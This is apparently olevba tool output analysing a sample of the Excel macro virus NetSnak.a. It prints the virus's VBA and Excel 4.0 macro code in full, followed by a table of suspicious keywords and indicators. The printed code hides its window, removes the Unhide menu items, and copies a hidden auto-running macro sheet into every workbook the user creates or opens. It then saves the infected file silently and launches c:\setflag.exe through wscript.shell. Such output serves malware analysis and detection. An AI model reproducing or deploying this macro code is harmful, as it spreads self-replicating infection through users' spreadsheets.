olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.NetSnak.a-d5047a88b17a34ca276c7f9c2b4505aaaf83a7a3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.NetSnak.a-d5047a88b17a34ca276c7f9c2b4505aaaf83a7a3 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim x As New Àà1
Private Sub Workbook_Open()
On Error Resume Next
Application.ShowWindowsInTaskbar = True
Application.Windows("norma1.xlm").Visible = False
MenuBars("Worksheet").Menus("¸ñÊ½(&O)").MenuItems("¹¤×÷±í(&H)").MenuItems("È¡ÏûÒþ²Ø(&U)...").Delete
MenuBars("Worksheet").Menus("´°¿Ú(&W)").MenuItems("È¡ÏûÒþ²Ø(&U)...").Delete
Set x.App = Application
If Workbooks.Count <= 1 Then
Workbooks.Add
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Àà1.cls 
in file: Virus.MSExcel.NetSnak.a-d5047a88b17a34ca276c7f9c2b4505aaaf83a7a3 - OLE stream: '_VBA_PROJECT_CUR/VBA/类1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WithEvents App As Application
Attribute App.VB_VarHelpID = -1

Private Sub App_NewWorkbook(ByVal Wb As Workbook)
If Wb.Name = ThisWorkbook.Name Or Wb.Sheets(1).Name = "(m1)_(m2)_(m3)" Then
Exit Sub
End If
ThisWorkbook.Sheets("(m1)_(m2)_(m3)").Copy Wb.Sheets(1)
Wb.Sheets(1).Visible = False
Wb.Sheets(1).Name = "(m1)_(m2)_(m3)"
ThisWorkbook.Sheets("(m1)_(m2)_(m3)").Columns(2).Copy Wb.Sheets("(m1)_(m2)_(m3)").Columns(2)
Wb.Names.Add Name:="Auto_Open", RefersToR1C1:="='(m1)_(m2)_(m3)'!R1C1:R9C1", Category:="User Defined", MacroType:=xlCommand
Wb.Saved = True
End Sub

Private Sub App_WorkbookBeforeClose(ByVal Wb As Workbook, Cancel As Boolean)
On Error Resume Next
If Wb.Name = ThisWorkbook.Name Then
Exit Sub
End If
Cancel = False
hassaved = Wb.Saved
If hassaved = False Then
ch = MsgBox("ÎÄ¼þ¡°" & ActiveWorkbook.Name & "¡±ÒÑ±»ÐÞ¸Ä£¬ÊÇ·ñ±£´æÆäÐÞ¸ÄµÄÄÚÈÝ£¿", vbYesNoCancel + vbExclamation)
If ch = vbCancel Then
Cancel = True
Exit Sub
End If
If ch = vbNo Then
If InStr(Wb.Name, ".") <= 0 Then
Wb.Saved = True
Exit Sub
Else
SendKeys "{ESC}"
Wb.ChangeFileAccess xlReadOnly
GoTo quit
End If
End If
If ch = vbYes Then
If InStr(Wb.Name, ".") <= 0 Then
If Not Application.Dialogs(xlDialogSaveAs).Show(Wb.Name & ".xls") Then
Cancel = True
Exit Sub
Else
GoTo a1
End If
End If
Wb.Save
a1:
SendKeys "{ESC}"
Wb.ChangeFileAccess xlReadOnly
End If
Else
If InStr(Wb.Name, ".") <= 0 Then
Exit Sub
End If
SendKeys "{ESC}"
Wb.ChangeFileAccess xlReadOnly
End If
quit:
If Cancel = False And Wb.Sheets(1).Name = "(m1)_(m2)_(m3)" Then
setflag Wb
End If
Wb.Saved = True

End Sub

Private Sub App_WorkbookOpen(ByVal Wb As Workbook)
If Wb.Name = "normal.xlm" Then
Wb.Close
Exit Sub
End If
If Wb.Sheets(1).Name = "(m1)_(m2)_(m3)" And RTrim(LTrim(Wb.Sheets(1).Cells(45, 3).Value)) <> "word.quit" Then
Application.DisplayAlerts = False
Wb.Sheets("(m1)_(m2)_(m3)").Delete
Wb.Save
Application.DisplayAlerts = True
End If
If Wb.Name = ThisWorkbook.Name Or Wb.Sheets(1).Name = "(m1)_(m2)_(m3)" Then
Exit Sub
End If
For i = 1 To Workbooks.Count
If Workbooks(i).Name = "Book1" Then
If Workbooks(i).Saved = True Then
Workbooks(i).Close
GoTo a1
End If
End If
Next
a1:
ThisWorkbook.Sheets("(m1)_(m2)_(m3)").Copy Wb.Sheets(1)
Wb.Sheets(1).Visible = False
Wb.Sheets(1).Name = "(m1)_(m2)_(m3)"
ThisWorkbook.Sheets("(m1)_(m2)_(m3)").Columns(2).Copy Wb.Sheets("(m1)_(m2)_(m3)").Columns(2)
Wb.Names.Add Name:="Auto_Open", RefersToR1C1:="='(m1)_(m2)_(m3)'!R1C1:R8C1", Category:="User Defined", MacroType:=xlCommand
Wb.Save

End Sub
Private Sub setflag(ByVal Wb As Workbook)
Set w = CreateObject("wscript.shell")
exefile = "c:\setflag.exe"
w.Run exefile & " " & Chr(34) & Wb.FullName & Chr(34), 0, True
Set w = Nothing
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     22 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, visible -  (m1)_(m2)_(m3
' 0018     29 LABEL : Cell Value, String Constant - Counter len=7 ptgRef3d  (m1)_(m2)_(m3!C82 
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' Sheet,Reference,Formula,Value
'  (m1)_(m2)_(m3,A1,"FOPEN("c:\excel.txt",3)",""
'  (m1)_(m2)_(m3,A2,"FOR.CELL("Counter",R~0C~2,TRUE)",""
'  (m1)_(m2)_(m3,A3,A1,""
'  (m1)_(m2)_(m3,A4,NEXT(),""
'  (m1)_(m2)_(m3,A5,FCLOSE(A1),""
'  (m1)_(m2)_(m3,A6,VBA.INSERT.FILE("c:\excel.txt"),""
'  (m1)_(m2)_(m3,A7,"RUN("createcabfile",FALSE)",""
'  (m1)_(m2)_(m3,A8,RETURN(),""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |setflag.exe         |Executable file name                         |
|Suspicious|XLM macro           |XLM macro found. It may contain malicious    |
|          |                    |code                                         |
+----------+--------------------+---------------------------------------------+

